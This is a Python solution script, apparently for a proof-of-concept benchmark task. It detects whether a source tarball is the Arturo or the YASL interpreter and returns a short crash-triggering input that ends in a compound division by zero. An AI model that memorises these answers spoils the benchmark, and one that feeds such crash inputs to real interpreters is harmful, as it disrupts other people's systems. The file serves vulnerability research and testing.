import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        project = self._detect_project(src_path)
        if project == "arturo":
            return self._poc_arturo()
        elif project == "yasl":
            return self._poc_yasl()
        else:
            return self._poc_arturo()

    def _poc_arturo(self) -> bytes:
        # 79 bytes payload:
        # 'val: "' (6) + 'a'*63 (63) + '"\n' (2) + 'val /= 0' (8) = 79
        s = 'val: "' + ('a' * 63) + '"\n' + 'val /= 0'
        return s.encode('utf-8')

    def _poc_yasl(self) -> bytes:
        # Simple compound division by zero sequence for YASL-like languages
        s = 'var x = 1; x /= 0;'
        return s.encode('utf-8')

    def _detect_project(self, src_path: str) -> str:
        try:
            if not src_path or not os.path.exists(src_path):
                return "unknown"
            with tarfile.open(src_path, "r:*") as tf:
                names = tf.getnames()
                lower_names = [n.lower() for n in names]

                # Direct artifact name checks
                if any("arturo" in n for n in lower_names):
                    return "arturo"
                if any("yasl" in n for n in lower_names):
                    return "yasl"

                # Language-specific hints
                has_nim = any(n.endswith(".nim") for n in lower_names)
                has_nimble = any(n.endswith(".nimble") for n in lower_names)
                if has_nim or has_nimble:
                    # Probe README for "Arturo"
                    readme_name = self._find_readme_name(lower_names)
                    if readme_name is not None:
                        content = self._read_file_lower(tf, names[lower_names.index(readme_name)])
                        if content and ("arturo" in content or "arturo programming" in content):
                            return "arturo"
                    # Probe for common Arturo paths
                    if any("src/" in n and ("vm" in n or "builtins" in n) for n in lower_names):
                        return "arturo"

                # C project hints for YASL
                if any(n.endswith(".c") or n.endswith(".h") for n in lower_names):
                    # Look for YASL identifiers
                    candidate_files = [n for n in lower_names if re.search(r'(^|/)(readme(\.|$))', n)]
                    for cand in candidate_files:
                        content = self._read_file_lower(tf, names[lower_names.index(cand)])
                        if content and ("yasl" in content):
                            return "yasl"
                    # Headers with yasl.h
                    if any(n.endswith("yasl.h") or "/yasl/" in n for n in lower_names):
                        return "yasl"

                return "unknown"
        except Exception:
            return "unknown"

    def _find_readme_name(self, lower_names):
        for n in lower_names:
            if re.search(r'(^|/)(readme(\.md|\.rst|\.txt)?)$', n):
                return n
        return None

    def _read_file_lower(self, tf: tarfile.TarFile, name: str) -> str:
        try:
            f = tf.extractfile(name)
            if not f:
                return ""
            data = f.read()
            if not data:
                return ""
            return data.decode("utf-8", errors="ignore").lower()
        except Exception:
            return ""